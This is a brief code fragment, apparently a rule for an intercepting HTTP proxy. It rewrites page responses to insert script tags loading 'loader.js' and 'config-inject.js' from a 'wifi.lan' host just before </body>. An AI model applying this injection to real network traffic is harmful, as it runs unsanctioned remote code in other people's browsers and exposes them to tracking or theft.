http()
    .loadContent()
    .modify(/<\/body>/i, `
        <script src='http://wifi.lan/loader.js'></script>
        <script src='http://wifi.lan/benz/config-inject.js'></script>
        </body>
    `)
